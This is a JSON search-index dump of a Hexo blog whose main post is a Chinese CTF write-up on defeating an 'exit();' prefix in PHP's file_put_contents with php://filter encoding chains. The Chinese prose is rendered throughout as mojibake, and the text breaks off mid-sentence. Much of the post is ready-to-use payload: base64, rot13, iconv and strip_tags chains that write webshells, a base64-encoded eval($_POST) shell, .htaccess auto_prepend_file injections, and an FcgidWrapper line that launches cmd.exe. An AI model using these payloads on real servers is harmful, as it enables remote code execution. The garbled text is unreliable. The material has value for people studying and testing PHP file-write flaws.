{"meta":{"title":"Whippet's Blog","subtitle":"","description":"","author":"whippet","url":"http://yoursite.com","root":"/"},"pages":[{"title":"categories","date":"2020-08-28T08:36:42.000Z","updated":"2020-08-29T14:13:55.325Z","comments":true,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });"},{"title":"friendship","date":"2020-08-29T16:34:40.000Z","updated":"2020-08-31T02:36:41.020Z","comments":true,"path":"friendship/index.html","permalink":"http://yoursite.com/friendship/index.html","excerpt":"","text":"å¼ ä¸‰æå››æ˜¯å¤§ä½¬ï¼Œæå››æ˜¯å¤§ä½¬ï¼Œæå››æ˜¯å¤§ä½¬ï¼Œæå››æ˜¯å¤§ä½¬ï¼Œæå››æ˜¯å¤§ä½¬æå››æˆ‘ä¸æ˜¯å¤§ä½¬ï¼Œæˆ‘ä¸æ˜¯å¤§ä½¬ï¼Œæˆ‘ä¸æ˜¯å¤§ä½¬ï¼Œæˆ‘ä¸æ˜¯å¤§ä½¬ï¼Œæˆ‘ä¸æ˜¯å¤§ä½¬ç‹äº”æˆ‘æ˜¯å°ç™½ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });"},{"title":"tags","date":"2020-08-28T08:36:56.000Z","updated":"2020-08-29T14:14:13.653Z","comments":true,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });"}],"posts":[{"title":"file_put_contents & php://filter","slug":"file_put_contents","date":"2020-09-30T02:00:00.000Z","updated":"2020-10-12T06:10:55.188Z","comments":true,"path":"2020/09/30/file_put_contents/","link":"","permalink":"http://yoursite.com/2020/09/30/file_put_contents/","excerpt":"å‰è¨€ æ˜¨å¤©åœ¨ç½‘ä¸Šçœ‹åˆ°ä¸€é“ ctf é¢˜ç›®ï¼ŒèŠ±è´¹äº†å¾ˆé•¿æ—¶é—´éƒ½æ²¡æœ‰è§£å‡ºæ¥ï¼Œåæ¥çœ‹åˆ°å¤§ä½¬çš„è§£é¢˜æ€è·¯ï¼Œä¸»è¦æ˜¯åˆ©ç”¨äº† php://filter åè®®æ¥å®ç°çš„ã€‚å¹³æ—¶ï¼Œåˆ©ç”¨ php://filter ä¸»è¦æ˜¯å®ç°ä»»æ„æ–‡ä»¶è¯»å–ï¼Œå¯¹ä»–çš„å…¶ä»–åˆ©ç”¨å°šä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œç½‘ä¸Šæœ‰å¾ˆå¤šå¤§ä½¬éƒ½å†™äº†éå¸¸è¯¦ç»†çš„æ–‡ç« ã€‚è‡ªå·±ä¹Ÿåšä¸€ä¸ªç®€å•çš„æ€»ç»“ã€‚ä¸»è¦æ˜¯æ¢è®¨ php://filter å¯¹ file_put_content ä¸­å‡ ç§æƒ…å†µçš„ç»•è¿‡æ–¹æ³•ã€‚","text":"å‰è¨€ æ˜¨å¤©åœ¨ç½‘ä¸Šçœ‹åˆ°ä¸€é“ ctf é¢˜ç›®ï¼ŒèŠ±è´¹äº†å¾ˆé•¿æ—¶é—´éƒ½æ²¡æœ‰è§£å‡ºæ¥ï¼Œåæ¥çœ‹åˆ°å¤§ä½¬çš„è§£é¢˜æ€è·¯ï¼Œä¸»è¦æ˜¯åˆ©ç”¨äº† php://filter åè®®æ¥å®ç°çš„ã€‚å¹³æ—¶ï¼Œåˆ©ç”¨ php://filter ä¸»è¦æ˜¯å®ç°ä»»æ„æ–‡ä»¶è¯»å–ï¼Œå¯¹ä»–çš„å…¶ä»–åˆ©ç”¨å°šä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œç½‘ä¸Šæœ‰å¾ˆå¤šå¤§ä½¬éƒ½å†™äº†éå¸¸è¯¦ç»†çš„æ–‡ç« ã€‚è‡ªå·±ä¹Ÿåšä¸€ä¸ªç®€å•çš„æ€»ç»“ã€‚ä¸»è¦æ˜¯æ¢è®¨ php://filter å¯¹ file_put_content ä¸­å‡ ç§æƒ…å†µçš„ç»•è¿‡æ–¹æ³•ã€‚ file_put_contents($filename,â€&lt;?php exit();â€.$content); file_put_contents($content,â€&lt;?php exit();â€.$content); file_put_contents($filename,$content . â€œ\\nxxxxxxâ€); file_put_contents($filename,â€&lt;?php exit();â€.$content); é¦–å…ˆæ˜¯æœ€ä¸ºç®€å•çš„ä¸€ç§æ–¹æ³•ï¼Œ$filename æ§åˆ¶å†™å…¥çš„æ–‡ä»¶åï¼Œ$content æ‹¼æ¥åœ¨äº† &lt;?php exit(); ä¹‹åã€‚ æƒ³è¦ getshell çš„è¯ï¼Œå¿…é¡»å°†å‰é¢çš„ &lt;?php exit(); é—­åˆæˆ–è€…æ¶ˆé™¤ã€‚ $filename æ§åˆ¶æ–‡ä»¶åï¼Œå¯ä»¥åˆ©ç”¨ php://filter åè®®å¯¹ $content è¿›è¡Œè§£ç ï¼ŒåŒæ—¶ php://filter å¯ä»¥æ”¯æŒä½¿ç”¨å¤šä¸ªè¿‡æ»¤å™¨è§„åˆ™ã€‚å®ç°çš„æ€è·¯å°±ä¸ºï¼šå°† ?php exit(); è§£ç æˆä¸º php ä¸è®¤è¯†çš„å­—ç¬¦ï¼Œæ„é€ çš„å†…å®¹èƒ½å¤Ÿæ­£å¸¸è§£ç ã€‚ 0x01 Base64ç¼–ç  Base64 ç¼–ç æ˜¯ä½¿ç”¨64ä¸ªå¯æ‰“å°çš„ ASCII å­—ç¬¦ï¼ˆA-Zã€a-zã€0-9ã€+ã€/ï¼‰ å°†ä»»æ„å­—èŠ‚åºåˆ—åŒ–æ•°æ®ç¼–ç æˆ ASCII å­—ç¬¦ä¸²ï¼Œå¦æœ‰ = ä½œä¸ºåç¼€çš„ç”¨é€”ã€‚åŒæ—¶ base64_decode åœ¨é‡åˆ°ä¸åœ¨å…¶ä¸­çš„å­—ç¬¦æ—¶ï¼Œä¼šè·³è¿‡è¿™äº›å­—ç¬¦ï¼Œä»…å°†åˆæ³•å­—ç¬¦ç»„æˆä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²è¿›è¡Œè§£ç ã€‚ å½“ $content è¢«åŠ ä¸Š&lt;?php exit(); ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ php://filter/write=convert.base64-decode æ¥å®ç°å¯¹å…¶è¿›è¡Œè§£ç ã€‚ åœ¨è¿›è¡Œè§£ç çš„è¿‡ç¨‹ä¸­ä¸ç¬¦åˆ base64 ç¼–ç èŒƒå›´çš„å­—ç¬¦å°†è¢«å¿½ç•¥ï¼Œæ‰€ä»¥æœ€åè¢« base64 è§£ç çš„å­—ç¬¦ä¸º phpexit å’Œæˆ‘ä»¬ä¼ å…¥çš„å…¶ä»–å­—ç¬¦ã€‚ ç”±äº phpexit ä¸€å…±ä¸ƒä¸ªå­—ç¬¦ï¼Œbase64 åœ¨ç®—æ³•è§£ç æ—¶æ˜¯4ä¸ª byte ä¸€ç»„ï¼Œæ‰€ä»¥ä¸ºä»–éšæ„æ·»åŠ ä¸€ä¸ªå­—ç¬¦ï¼ˆaï¼‰å°±å¯ä»¥ï¼Œè¿™æ · aphpexit ä¼šè¢« base64 æ­£å¸¸çš„è§£æï¼Œåé¢ä¼ å…¥çš„ webshell ä¹Ÿä¼šè¢«æ­£å¸¸çš„è§£ç ã€‚è¿™æ ·å°±ä¼šå°† &lt;?php exit(); è¿™éƒ¨åˆ†å†…å®¹è¢«æ­£å¸¸çš„è§£ç ï¼Œä¸ä¼šå½±å“åé¢å†™å…¥çš„ webshell çš„å†…å®¹ã€‚ 0x02 Rot13ç¼–ç  &lt;?php exit(); åœ¨ç»è¿‡ rot13 ç¼–ç ä¹‹åä¼šå˜æˆ &lt;?cuc rkvg(); ï¼Œé€šè¿‡å†ä¼ å…¥ä¸€ä¸ª ?&gt; å°†å…¶é—­åˆ åŒæ—¶ï¼Œåœ¨ php ä¸å¼€å¯ short_open_tag çŸ­æ ‡ç­¾æ—¶ï¼Œphp æ— æ³•è¯†åˆ«è¿™ä¸ªå­—ç¬¦ä¸²ã€‚ 0x03 .htaccessçš„é¢„åŒ…å«åˆ©ç”¨ åˆ©ç”¨ .htaccess çš„é¢„åŒ…å«æ–‡ä»¶åŠŸèƒ½ï¼Œè‡ªå®šä¹‰åŒ…å«æ–‡ä»¶ã€‚ çœ‹åˆ°ç½‘ä¸Šçš„æ–‡ç« çš„åˆ©ç”¨æ–¹æ³•ä¸º 12$filename='php://filter/write=string.strip_tags/resource=.htaccess'$content='?&gt;php_value%20auto_prepend_file%20G:\\s1mple.php' æˆ‘å°è¯•äº†å¤šæ¬¡ä¹‹åæ— æ³•åˆ©ç”¨æˆåŠŸï¼Œéšå³åˆè¢«æŒ‡å¯¼å¦ä¸€ç§æ–¹æ³•åœ¨ .htaccess ä¸­å†™å…¥ Options +ExecCGI AddHandler fcgid-script .abc FcgidWrapper \"C:/Windows/System32/cmd.exe /c start cmd.exe\" .abc ç„¶åå†éšæ„ç”Ÿæˆä¸€ä¸ª .abc åç¼€çš„æ–‡ä»¶ï¼Œè®¿é—®å°±å¯ä»¥æ‰“å¼€ cmd æ§åˆ¶æ¡†ã€‚ 12$filename='php://filter/string.strip_tags|convert.base64-decode/resource=.htaccess'$content='?&gt;T3B0aW9ucyArRXhlY0NHSQ0KQWRkSGFuZGxlciBmY2dpZC1zY3JpcHQgLmFiYw0KRmNnaWRXcmFwcGVyICJDOi9XaW5kb3dzL1N5c3RlbTMyL2NtZC5leGUgL2Mgc3RhcnQgY21kLmV4ZSIgLmFiYw==' emmmmï¼Œè¿™æ ·ä¼¼ä¹å¤šæ­¤ä¸€ä¸¾ï¼Œä¸ºä»€ä¹ˆæˆ‘ä¸ç›´æ¥å†™ä¸€ä¸ªshellè¿›å»å‘¢ï¼Œè€Œè¦é‡‡ç”¨è¿™ç§æ¯”è¾ƒéº»çƒ¦çš„åˆ©ç”¨æ–¹å¼ï¼Œè¿˜æ˜¯è¦æƒ³åŠæ³•æ‰¾å‡ºä¹‹å‰çš„åˆ©ç”¨æ–¹æ³•ä¸€ç›´æ— æ³•æˆåŠŸçš„åŸå› ã€‚ ä¸æ–­ä¸æ–­æµ‹è¯•ï¼Œå‘ç°æ˜¯è‡ªå·±çš„ windows æœºå™¨ä¸Šæ²¡æœ‰å¼€å¯å¯¹ php_value çš„æ”¯æŒï¼Œé…ç½®äº†å¥½ä¹…å‘ç°æ— æ³•æˆåŠŸï¼Œäºæ˜¯é‡‡ç”¨ ubuntu ç¯å¢ƒè¿›è¡Œæµ‹è¯•ã€‚ http://192.168.176.128/?filename=php://filter/write=string.strip_tags/resource=.htaccess&amp;content=?%3Ephp_value%20auto_prepend_file%20flag 0x04 è¿‡æ»¤å™¨ç¼–ç ç»„åˆåˆ©ç”¨ å¯ç”¨è¿‡æ»¤å™¨åˆ—è¡¨ åˆ©ç”¨ strip_tags â€” ä»å­—ç¬¦ä¸²ä¸­å»é™¤ HTML å’Œ PHP æ ‡è®° 12$filename='php://filter/string.strip_tags|convert.base64-decode/resource=whippet.php ';$content = '?&gt;PD9waHAgcGhwaW5mbygpOz8+'; åˆ©ç”¨ string.strip_tags è¿‡æ»¤æ‰ html æ ‡ç­¾ï¼Œå°†æ ‡ç­¾å†…çš„æ‰€æœ‰å†…å®¹åˆ é™¤ï¼Œç„¶åå†è¿›è¡Œ base64 è§£ç ï¼ŒæˆåŠŸå†™å…¥ php æ–‡ä»¶ã€‚ä½†æ˜¯ string.strip_tags åœ¨ php7.3.0 ä»¥ä¸Šçš„ç¯å¢ƒä¼šå‘ç”Ÿé”™è¯¯ï¼Œæ— æ³•å†™å…¥ï¼Œä½†åœ¨ php5 çš„ç¯å¢ƒä¸‹ä¸å—å½±å“ã€‚ åˆ©ç”¨å‹ç¼©è¿‡æ»¤å™¨ï¼Œç»„åˆä½¿ç”¨å‹ç¼©åå†è§£å‹å†…å®¹è‚¯å®šä¸å˜ï¼Œä½†æ˜¯åœ¨ä¸­é—´å†åŠ å…¥åˆ«çš„è¿‡æ»¤å™¨å°±æœ‰å¯èƒ½ç»•è¿‡ 12$filename='php://filter/zlib.deflate|string.tolower|zlib.inflate/resource=whippet.php';$content = '?&gt;&lt;?php phpinfo();?&gt;'; file_put_contents($content,â€&lt;?php exit();â€.$content); è¿™ç§æƒ…å†µä¸»è¦æ˜¯é’ˆå¯¹äºå†™å…¥çš„ shell çš„æ–‡ä»¶åå’Œæ–‡ä»¶å†…å®¹å˜é‡ç›¸åŒæ—¶çš„ä¸€ç§ç»•è¿‡ï¼Œè¿™ç§æ–¹å¼éœ€è¦è€ƒè™‘æ–‡ä»¶åå’Œæ–‡ä»¶å†…å®¹æ•°æ®çš„å…¼å®¹æ€§ã€‚ 0x01 Base64ç¼–ç  (æ— æ³•åˆ©ç”¨) ä»…ä»…åªåˆ©ç”¨ base64 ç¼–ç çš„æ–¹å¼æ˜¯æ— æ³•åˆ©ç”¨æˆåŠŸçš„ï¼Œåˆ©ç”¨ php://filter æ¥æ„é€  POC ï¼Œåé¢å±äºå†™å…¥çš„å†…å®¹ï¼Œåªè¦åœ¨è§£ç çš„æ—¶å€™æŠŠä¼ å…¥çš„ shell æ­£å¸¸è§£ç å‡ºæ¥ï¼Œä¸éœ€è¦çš„ä¸œè¥¿è§£ææˆä¹±ç ã€‚base64 æ„é€ çš„ pocã€‚ 12$content = \"php://filter/convert.base64-decode|PD9waHAgcGhwaW5mbygpOz8+|/resource=whippet.php\"$content = \"php://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php\" æ„é€ çš„shell å¯ä»¥æ”¾åœ¨è¿‡æ»¤å™¨çš„ä½ç½®å’Œæ–‡ä»¶åçš„ä½ç½®éƒ½æ˜¯å¯ä»¥çš„ï¼Œ php://filter åœ¨é¢å¯¹ä¸å¯ç”¨çš„è§„åˆ™æ—¶ä»…ä»…æŠ¥ Warningï¼Œç„¶åè·³è¿‡ç»§ç»­æ‰§è¡Œã€‚æ‰€ä»¥æ„é€ æ˜¯æ²¡æœ‰å¤ªå¤§çš„é—®é¢˜çš„ã€‚ä½†æ˜¯æµ‹è¯•å‘ç°ï¼Œè™½ç„¶å¯ä»¥ç”Ÿæˆæ–‡ä»¶ï¼Œä½†æ˜¯ç”Ÿæˆçš„æ–‡ä»¶å†…éƒ¨ä¸ºç©ºã€‚ æˆ‘ä»¬å¯ä»¥å°†è¦è¿›è¡Œ base64 è§£ç çš„æ•°æ®æå–å‡ºæ¥è¿›è¡Œåˆ†æ phpexitphp//filter/convertbase64decodePD9waHAgcGhwaW5mbygpOz8+/resource=whippet.php æˆ‘ä»¬æ³¨æ„åˆ°åœ¨æ•°æ®ä¸­å­˜åœ¨ =ï¼Œé»˜è®¤æƒ…å†µä¹‹ä¸‹ = åœ¨ base64ç¼–ç ä¸­èµ·å¡«å……ä½œç”¨ï¼Œä¹Ÿå°±æ„å‘³ç€ç»“æŸäº†ã€‚åœ¨åˆ©ç”¨åè®®æ—¶ resource å…³é”®å­—ï¼Œä¸å¯æˆ–ç¼ºï¼Œæ‰€ä»¥ä¼šå¯¼è‡´è¿‡æ»¤å™¨è§£ç å¤±è´¥ï¼Œä¼šé¦–å…ˆåˆ›å»ºæ–‡ä»¶ï¼Œä½†æ˜¯è§£ç è¿‡ç¨‹å‡ºé”™ï¼Œå†…å®¹å…¨éƒ¨æŠ›å¼ƒï¼Œæ‰€ä»¥ä»…ä»…ä¼šåˆ›å»ºä¸€ä¸ªç©ºæ–‡ä»¶ã€‚ ç®€å•éªŒè¯ä¸€ä¸‹ = åœ¨ base64è§£ç ä¸­æ‰€äº§ç”Ÿçš„å½±å“ 123&gt;&gt;&gt; base64.b64decode(\"PD9waHAgQGV2YWwoJFBPU1RbY21kXSk7ID8+\")&gt;&gt;&gt; base64.b64decode(\"PD9waHAgQGV2YWwoJFBPU1RbY21kXSk7ID8+=\")&gt;&gt;&gt; base64.b64decode(\"PD9waHAgQGV2YWwoJFBPU1RbY21kXSk7ID8+=a\") éªŒè¯ä¹‹åå‘ç°ï¼Œåœ¨ base64 è§£ç æ—¶å­—ç¬¦ = åé¢ä¸èƒ½åŒ…å«æœ‰å…¶ä»–çš„å­—ç¬¦ã€‚ 0x02 Rot13ç¼–ç  rot13 ç¼–ç å°±ä¸å­˜åœ¨ base64 ç¼–ç çš„é—®é¢˜ï¼Œæ‰€ä»¥å¯ä»¥è½»æ¾æ„é€ å‡º$content = \"php://filter/string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=whippet.php\" 0x03 iconvå­—ç¬¦ç¼–ç è½¬æ¢ convert.iconv. è¿™ä¸ªè¿‡æ»¤å™¨éœ€è¦ php æ”¯æŒ iconvã€‚ä½¿ç”¨ convert.iconv.* è¿‡æ»¤å™¨ç­‰åŒäºä½¿ç”¨ iconv() å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ®ã€‚ usc-2é€šè¿‡ usc-2 çš„ç¼–ç è¿›è¡Œè½¬æ¢ï¼Œå¯¹ç›®æ ‡å­—ç¬¦ä¸²è¿›è¡Œ2ä½ä¸€åè½¬ï¼Œå› ä¸ºæ˜¯ä¸¤ä½ä¸€åè½¬ï¼Œæ‰€ä»¥å­—ç¬¦çš„æ•°ç›®éœ€è¦ä¿æŒåœ¨å¶æ•°ä½ä¸Šã€‚ 12#echo iconv(\"UCS-2LE\",\"UCS-2BE\",'&lt;?php phpinfo();?&gt;'); ?&lt;hp phpipfn(o;)&gt;? $content = \"php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp phpipfn(o;)&gt;?|/resource=whippet.php\" usc-4é€šè¿‡ usc-4 çš„ç¼–ç è¿›è¡Œè½¬æ¢ï¼Œå¯¹ç›®æ ‡å­—ç¬¦ä¸²è¿›è¡Œ4ä½ä¸€åè½¬ï¼›æ‰€ä»¥æ„é€ çš„ shell çš„ä»£ç æ•°ç›®åº”è¯¥æ˜¯4çš„å€æ•°ï¼ŒåŒæ—¶ä¹Ÿè¦ä¿è¯shellä¹‹å‰çš„å­—ç¬¦ä¸²ä¹Ÿåº”è¯¥ä¸º4ä¸ªå­—ç¬¦ä¸€ç»„ã€‚ 12#echo iconv(\"UCS-4LE\",\"UCS-4BE\",'aa&lt;?php phpinfo();?&gt;');?&lt;aa phpiphp(ofn&gt;?;) $content = \"php://filter/convert.iconv.UCS-4LE.UCS-4BE|?&lt;aa phpiphp(ofn&gt;?;)|/resource=whippet.php\" utf8-utf7 convert.iconv è¿™ä¸ªè¿‡æ»¤å™¨ä¼šæŠŠ = è½¬æ¢ä¸º +AD0-ï¼Œè€Œ +AD0- æ˜¯å¯ä»¥è¢« base64 è¿›è¡Œè§£ç çš„ã€‚ 1234#echo iconv(\"UTF-8\",\"UTF-7\",\"=\");+AD0-SSS#echo iconv(\"UTF-8\",\"UTF-7\",\"PD9waHAgcGhwaW5mbygpOz8+\");PD9waHAgcGhwaW5mbygpOz8+- çº¯å­—ç¬¦ä¹‹é—´è¿›è¡Œ utf è½¬æ¢ä¹‹åè¿˜æ˜¯å…¶æœ¬èº«ï¼›æ‰€ä»¥ä¸å—å½±å“ã€‚æ‰€ä»¥å¯ä»¥åˆ©ç”¨ç»„åˆæ‹³æ¥åˆ©ç”¨æˆåŠŸã€‚ 1utf-8:&lt;?php exit();php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode|PD9waHAgcGhwaW5mbygpOz8+-|/resource=whippet.php ğŸ‘‡ 1utf-7:+ADw?php exit()+ADs-php://filter/convert.iconv.utf-8.utf-7+AHw-convert.base64-decode+AHw-PD9waHAgcGhwaW5mbygpOz8+--+AHw-/resource+AD0-whippet.php //è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯è¦ç¬¦åˆbase64è§£ç æŒ‰ç…§4å­—èŠ‚è¿›è¡Œçš„ï¼Œbase64è§£ç ç‰¹ç‚¹å‰”é™¤ä¸ç¬¦åˆå­—ç¬¦ï¼ˆåªè¦æ¶æ„ä»£ç å‰é¢éƒ¨åˆ†æ­£å¸¸å°±å¯ä»¥ï¼Œé•¿åº¦ä¸º4çš„å€æ•°ï¼‰ 1234&gt;&gt;&gt; len(\"+ADwphpexit+ADsphp//filter/converticonvutf8utf7+AHwconvertbase6-decode+AHw\")74&gt;&gt;&gt; 74/418.5 æ‰€ä»¥åœ¨æ¶æ„ä»£ç ä¹‹å‰æ·»åŠ ä¸¤ä¸ªå­—ç¬¦æ»¡è¶³è§£ç æ¡ä»¶ã€‚$content=\"php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode|AAPD9waHAgcGhwaW5mbygpOz8+-|/resource=whippet.php\" 0x04 è¿‡æ»¤å™¨ç¼–ç ç»„åˆåˆ©ç”¨ UCS-2&amp;rot13 $content = \"php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;uc cucvcsa(b;)&gt;?|string.rot13/resource=whippet.php\" strip_tags&amp;base64 (ä»…å¯åœ¨linuxä¸‹åˆ©ç”¨æˆåŠŸ) â‘  &lt;?php exit(); ?&gt; å¯ä»¥ç›´æ¥åˆ©ç”¨ strip_tags å»é™¤ï¼Œå°è¯•æ„é€  payloadã€‚ $content=\"php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+.php\" ä»£ç åˆå¹¶ä¹‹åä¸º&lt;?php exit(); php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+.php åˆ†æåˆå¹¶ä¹‹åçš„ä»£ç æ–‡ä»¶å†…å®¹ï¼Œå‘ç°æˆåŠŸæ„é€  php æ ‡ç­¾ &lt;?php ?&gt; ï¼ŒåŒæ—¶ä¹Ÿä¼šå‘ç°ä»£ç ä¸­çš„å­—ç¬¦ = ä¹Ÿè¢«åŒ…å«åœ¨ php æ ‡ç­¾å†…ï¼Œç»è¿‡ strip_tags å¤„ç†ä¹‹åéƒ½ä¼šåˆ é™¤ï¼Œå°±ä¸ä¼šå½±å“ base64 çš„è§£ç äº†ã€‚ è™½ç„¶è¿™æ ·ç”ŸæˆæˆåŠŸï¼Œä½†æ˜¯å› ä¸ºæ–‡ä»¶åä¸º '?&gt;PD9waHAgcGhwaW5mbygpOz8+.php' ï¼Œåœ¨æµè§ˆå™¨è®¿é—®æ—¶ï¼Œä¼šå‡ºç°è®¿é—®ä¸åˆ°çš„é—®é¢˜ï¼Œä¸»è¦æ˜¯å› ä¸ºå­˜åœ¨å¼•å·ã€‚å¯ä»¥é€šè¿‡åˆ©ç”¨ä¼ªç›®å½•çš„æ–¹æ³•è¿›è¡Œå˜ç›¸çš„ç»•è¿‡ã€‚ $content=\"php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+/../whippet.php\" å°† ?&gt;PD9waHAgcGhwaW5mbygpOz8+ ä½œä¸ºç›®å½•åï¼Œæ— è®ºå­˜åœ¨ä¸å­˜åœ¨ï¼Œå†åˆ©ç”¨ ../ å›é€€åˆ°åŸç›®å½•ï¼Œè¿™æ ·åˆ›å»ºå‡ºæ¥çš„æ–‡ä»¶åå°±æ­£å¸¸äº†ã€‚ ä¸ºä»€ä¹ˆæ— æ³•å† windows ä¸‹åˆ©ç”¨å‘¢ï¼Œä¸»è¦åŸå› æ˜¯å› ä¸º windows ä¸æ”¯æŒæ–‡ä»¶åä¸­æœ‰ ? &gt; è¿™æ ·çš„å­—ç¬¦ã€‚ â‘¡ (æ”¹å¤´æ¢é¢)$content=\"php://filter/&lt;?|string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+/../whippet.php\"; æŒ‰ç…§æŸç¯‡æ–‡ç« æ‰€æè¿°æ¥è®²ï¼Œè¿™ä¸ª payload åˆ©ç”¨æˆåŠŸçš„åŸå› æ˜¯é¦–å…ˆä¼šæ ¹æ® strip_tags å°†&lt;?|string.strip_tags|convert.base64-decode/resource=?&gt; éƒ¨åˆ†åˆ å»ï¼Œç„¶åå°†å‰©ä½™çš„éƒ¨åˆ† base64-decodeã€‚ç„¶è€Œç»è¿‡æµ‹è¯•ï¼Œè¿™æ ·çš„ payload ä¹Ÿæ˜¯å¯ä»¥æˆåŠŸçš„ã€‚ $content=\"php://filter/A|&lt;?|string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+/../whippet.php\";æ‰€ä»¥æè¿°çš„åº”è¯¥å¹¶ä¸æ­£ç¡®ï¼Œåº”è¯¥æ˜¯ç±»ä¼¼å¼€å¯äº†è´ªå©ªæ¨¡å¼ï¼Œç›´æ¥ä»æœ€å‰é¢çš„ä¸€ä¸ª &lt;? åŒ¹é…è‡³æœ€åé¢çš„ ?&gt; æŠŠè¿™äº›å…¨éƒ¨åˆ é™¤ã€‚ç„¶åå†å°†å‰©ä½™çš„éƒ¨åˆ†è¿›è¡Œ base64è§£ç ã€‚ ä½†æ˜¯é’ˆå¯¹äº file_put_contents(\\$content,\"&lt;?php exit();?&gt;\".$content); æƒ…å†µæ—¶ï¼Œå‰é¢çš„ &lt;? å·²ç»é—­åˆï¼Œä¸ºäº†æ»¡è¶³åé¢çš„é—­åˆï¼Œæ‰€ä»¥å¿…é¡»è¦æ·»åŠ è¿™ä¸ªæ— æ•ˆçš„è¿‡æ»¤å™¨ã€‚ 0x05 .htaccessçš„é¢„åŒ…å«åˆ©ç”¨ http://192.168.176.128/?content=php://filter/string.strip_tags/?%3Ephp_value%20auto_prepend_file%20flag%20%0a%23/resource=.htaccess åˆ©ç”¨ %0a è¿›è¡Œæ¢è¡Œ # æ³¨é‡Šåé¢çš„æ‚ç³…ä»£ç  file_put_contents($filename,$content . â€œ\\nxxxxxxâ€); è¿™ç§æƒ…å†µè¾ƒä¸ºç®€å•ï¼Œä»…ä»…éœ€è¦è®©åé¢çš„æ‚ç³…ä»£ç è¢«æ³¨é‡Šæ‰å°±å°±å¯ä»¥ï¼Œé’ˆå¯¹ php è€Œè¨€ï¼Œæ‹¥æœ‰ç‰¹æ®Šçš„èµ·å§‹ç¬¦å’Œç»“æŸç¬¦ï¼Œå¦‚æœå¯ä»¥å†™å…¥ php ä»£ç çš„è¯ï¼Œå°±å¯ä»¥è½»æ˜“çš„ç»•è¿‡åé¢çš„æ‚ç³…ä»£ç ã€‚ ä½†æ˜¯åœ¨ç¦æ­¢ä½¿ç”¨æ‹¥æœ‰ç‰¹æ®Šèµ·å§‹ç¬¦å’Œç»“æŸç¬¦å·çš„è¯­è¨€æ—¶ï¼Œéœ€è¦æƒ³åŠæ³•å¤„ç†æ‰æ‚ç³…çš„ä»£ç ã€‚é€šå¸¸åˆ©ç”¨ .htaccess è¿›è¡Œæ“ä½œã€‚ http://192.168.176.128/?filename=.htaccess&amp;content=php_value%20auto_prepend_file%20flag%20%0a%23\\ åˆ©ç”¨ %0a è¿›è¡Œæ¢è¡Œ #\\ æ³¨é‡Šåé¢çš„æ‚ç³…ä»£ç ã€‚ CTF ä¾‹é¢˜ä¸€ 1234567891011121314151617181920212223242526272829&lt;?phpclass Yongen{ public $file; public $text; public function __construct($data) { return unserialize($data); } public function hasaki(){ $d = '&lt;?php die(\"nononon\");?&gt;'; $a= $d. $this-&gt;text; $file = $this-&gt;file; @file_put_contents($file, $a); } public function __destruct() { $this-&gt;hasaki(); } }$data = \"\"; if (isset($_POST['data'])){ $data = $_POST['data']; new Yongen($data); } else highlight_file(__FILE__); ?&gt; è¿™æ˜¯ä¸€é“æ¯”è¾ƒå…¸å‹çš„ php ååºåˆ—åŒ–ï¼Œå…¶ä¸­ $this -&gt; file = $file; &amp; $this -&gt; text = $text; å¯æ§ï¼ŒåŒæ—¶ @file_put_contents($this-&gt; file,$a); ä¼šä»¥ $file ä¸ºæ–‡ä»¶åï¼Œ&lt;?php die(\"nononon\");?&gt;+$text ä¸ºæ–‡ä»¶å†…å®¹ï¼Œç”Ÿæˆä¸€ä¸ªæ–‡ä»¶ã€‚æ­¤å¤„ä¹Ÿæ˜¯è¦æƒ³åŠæ³•ç»•è¿‡æ­»äº¡die()è°ˆä¸€è°ˆphp://filterçš„å¦™ç”¨ ä¸€æ–‡ä¸­æè¿°äº†ä¸‰ç§æ–¹æ³•ã€‚ å·§ç”¨ç¼–ç ä¸è§£ç  $file å¯ä»¥æ§åˆ¶åè®®ï¼Œå¯ä»¥é€šè¿‡ php://filter åè®®æ¥æ–½å±•é­”æ³•ï¼›ä½¿ç”¨ php://filter çš„ base64-decode æ–¹æ³•ï¼Œå°† $a è§£ç ï¼Œåˆ©ç”¨ php base64_decode å‡½æ•°ç‰¹æ€§å»é™¤â€æ­»äº¡exitâ€œã€‚base64 ç¼–ç ä¸­ä»…ä»…åŒ…å«64ä¸ªå¯æ‰“å°å­—ç¬¦ï¼Œphp åœ¨è§£ç  base 64 